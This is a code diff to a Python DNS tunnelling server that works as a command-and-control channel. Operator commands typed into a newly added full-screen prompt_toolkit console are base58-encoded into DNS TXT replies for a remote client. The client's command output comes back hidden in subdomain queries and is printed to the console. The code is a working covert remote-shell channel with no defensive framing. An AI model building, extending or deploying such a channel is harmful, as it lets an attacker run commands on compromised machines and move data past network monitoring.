@@ -5,8 +5,40 @@ import queue
 import struct
 import base58
 
+from prompt_toolkit.application import Application
+from prompt_toolkit.document import Document
+from prompt_toolkit.key_binding import KeyBindings
+from prompt_toolkit.layout.containers import HSplit, Window
+from prompt_toolkit.layout.layout import Layout
+from prompt_toolkit.styles import Style
+from prompt_toolkit.widgets import SearchToolbar, TextArea
+
 domain = "example.com"
 q_commands = queue.Queue()
+
+help_text = """
+Type a command to be sent to the client
+Press Control-Q to exit.
+
+"""
+
+output_field = TextArea(style="class:output-field", text=help_text)
+search_field = SearchToolbar()
+input_field = TextArea(
+    height=1,
+    prompt=">>> ",
+    style="class:input-field",
+    multiline=False,
+    wrap_lines=False,
+    search_field=search_field,
+)
+
+
+def print_buffer(data):
+    new_text = output_field.text + data
+    output_field.buffer.document = Document(
+        text=new_text, cursor_position=len(new_text)
+    )
 
 
 class TunnelResolver(BaseResolver):
@@ -25,7 +57,8 @@ class TunnelResolver(BaseResolver):
                 command_txt = q_commands.get(block=False, timeout=None)
             except queue.Empty:
                 command_txt = ""
-            reply.add_answer(*RR.fromZone("{} 60 IN TXT \"{}\"".format(qname, base58.b58encode(command_txt.encode("utf-8")).decode("ascii"))))
+            reply.add_answer(*RR.fromZone(
+                "{} 60 IN TXT \"{}\"".format(qname, base58.b58encode(command_txt.encode("utf-8")).decode("ascii"))))
         elif request.q.qtype == 1 and ("out." + domain + ".") in qstr:
             self.__parse_out(qstr)
             reply.add_answer(*RR.fromZone("{} 3600 IN A {}".format(qname, "127.255.255.255")))
@@ -37,15 +70,15 @@ class TunnelResolver(BaseResolver):
     the response using base58. The two first bytes are used as the seq number. The Msb bit 
     for the first byte is used to indicate that this is the last packet for the response.
     """
+
     def __parse_out(self, request):
         self.__is_receiving = True
 
         top_level = "out" + domain + "."
-        data_str = request[:-(len(top_level)+1)]
+        data_str = request[:-(len(top_level) + 1)]
         data_block = list(filter(None, data_str.split(".")))
 
         seq_num = 0
-        correct_order = False
         response_buffer = []
         for i, block in enumerate(data_block):
             # Base58 decode
@@ -54,10 +87,6 @@ class TunnelResolver(BaseResolver):
                 last_packet, seq_num, data = self.__parse_first_block(block_decoded)
                 if last_packet:
                     self.__is_receiving = False
-
-                if self.__seq_num == (seq_num - 1):
-                    # The order is expected
-                    correct_order = True
                 self.__seq_num = seq_num
             else:
                 data = block_decoded
@@ -82,18 +111,19 @@ class TunnelResolver(BaseResolver):
 
     def __flush(self):
         missing_packet = False
-        for i in range(self.__seq_num+1):
+        for i in range(self.__seq_num + 1):
             if i in self.__buffer:
-                print(self.__buffer[i].decode("ascii"), end="")
+                print_buffer(self.__buffer[i].decode("ascii"))
             else:
                 missing_packet = True
 
         if missing_packet:
-            print("[!] Some packets are missing!")
+            print_buffer("[!] Some packets are missing!\n")
         self.__buffer = {}
 
+
 p = argparse.ArgumentParser(description="Fixed DNS Resolver")
-p.add_argument("--port", "-p", type=int, default=53,
+p.add_argument("--port", "-p", type=int, default=5300,
                metavar="<port>",
                help="Server port (default:53)")
 p.add_argument("--address", "-a", default="",
@@ -113,7 +143,7 @@ args = p.parse_args()
 resolver = TunnelResolver()
 logger = DNSLogger(args.log, args.log_prefix)
 
-print("Starting Tunnel Resolver (%s:%d) [%s]" % (
+print_buffer("Starting Tunnel Resolver (%s:%d) [%s]\n" % (
     args.address or "*",
     args.port,
     "UDP/TCP" if args.tcp else "UDP"))
@@ -132,7 +162,55 @@ if args.tcp:
                            logger=logger)
     tcp_server.start_thread()
 
-while udp_server.isAlive():
-    command = input()
-    if len(command) <= 255 and len(command) > 0:
-        q_commands.put(command)
+container = HSplit(
+    [
+        output_field,
+        Window(height=1, char="-", style="class:line"),
+        input_field,
+        search_field,
+    ]
+)
+kb = KeyBindings()
+
+
+@kb.add("c-q")
+def _(event):
+    event.app.exit()
+
+
+@kb.add("c-c")
+def _(event):
+    q_commands.put('\x03')
+
+
+style = Style(
+    [
+        ("input-field", "bg:#000000 #ffffff"),
+        ("line", "#004400"),
+    ]
+)
+application = Application(
+    layout=Layout(container, focused_element=input_field),
+    key_bindings=kb,
+    style=style,
+    mouse_support=True,
+    full_screen=True,
+)
+
+
+def accept(buff):
+    command = input_field.text
+    if 255 >= len(command) > 0:
+        if command == "clear":
+            output_field.buffer.document = Document(
+                text=help_text, cursor_position=len(help_text)
+            )
+        elif command == "exit":
+            application.exit()
+        else:
+            print_buffer(command + "\n")
+            q_commands.put(command)
+
+
+input_field.accept_handler = accept
+application.run()
